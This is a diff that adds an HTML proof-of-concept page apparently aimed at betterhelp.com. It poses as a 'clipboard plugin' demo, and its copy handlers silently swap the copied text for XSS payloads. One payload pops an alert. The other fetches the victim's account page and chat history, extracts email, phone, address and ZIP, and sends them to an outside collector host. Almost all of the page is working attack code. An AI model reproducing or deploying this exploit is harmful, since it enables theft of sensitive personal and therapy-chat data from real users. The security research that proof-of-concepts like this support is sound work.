@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clipboard Plugin</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background: #f5f5f5;
+        }
+        
+        .wrapper {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .box {
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 30px 40px;
+            text-align: center;
+            width: 320px;
+        }
+        
+        .box h3 {
+            margin: 0 0 6px;
+            font-size: 15px;
+            color: #333;
+        }
+        
+        .box p {
+            color: #888;
+            margin: 0 0 16px;
+            font-size: 13px;
+        }
+        
+        .copy-text {
+            background: #eef;
+            padding: 12px 20px;
+            border-radius: 6px;
+            cursor: text;
+            user-select: all;
+            font-size: 15px;
+            color: #333;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrapper">
+        <div class="box">
+            <h3>PoC 1 - alert(document.domain)</h3>
+            <p>Proves JS execution in the betterhelp.com origin</p>
+            <div class="copy-text" id="poc1">Try out our new clipboard plugin!</div>
+        </div>
+        <div class="box">
+            <h3>PoC 2 - PII Exfiltration</h3>
+            <p>Steals email, phone, address, ZIP and chat history</p>
+            <div class="copy-text" id="poc2">Try out our new clipboard plugin!</div>
+        </div>
+    </div>
+
+    <script>
+        var COLLECTOR = '//q9fpgq7v.instances.httpworkbench.com';
+
+        var GADGET =
+            "fetch('/account/',{credentials:'include'}).then(r=>r.text()).then(a=>{" +
+            "var p={" +
+            "email:(a.match(/email_change.{0,120}?value=&quot;([^&quot;]+)/)||[])[1]||''," +
+            "phone:(a.match(/e_phone_number.{0,120}?value=&quot;([^&quot;]+)/)||[])[1]||''," +
+            "addr:(a.match(/e_address.{0,120}?value=&quot;([^&quot;]+)/)||[])[1]||''," +
+            "zip:(a.match(/e_zip.{0,120}?value=&quot;([^&quot;]+)/)||[])[1]||''};" +
+            "fetch('/api/more_messages/',{credentials:'include'}).then(r=>r.text()).then(c=>{" +
+            "p.chat=c.slice(0,1500);" +
+            "new Image().src=COLLECTOR_+'/x?d='+encodeURIComponent(JSON.stringify(p));" +
+            "});" +
+            "})";
+
+        GADGET = "var COLLECTOR_='" + COLLECTOR + "';" + GADGET;
+
+        var PAYLOAD_ALERT = 'XSS<img src=x onerror="alert(document.domain)">';
+        var PAYLOAD_EXFIL = 'XSS<img src=x onerror="' + GADGET + '">';
+
+        document.getElementById('poc1').oncopy = function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.clipboardData.setData('text/plain', PAYLOAD_ALERT);
+            e.clipboardData.setData('text/html', PAYLOAD_ALERT);
+        };
+
+        document.getElementById('poc2').oncopy = function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.clipboardData.setData('text/plain', PAYLOAD_EXFIL);
+            e.clipboardData.setData('text/html', PAYLOAD_EXFIL);
+        };
+    </script>
+</body>
+
+</html>
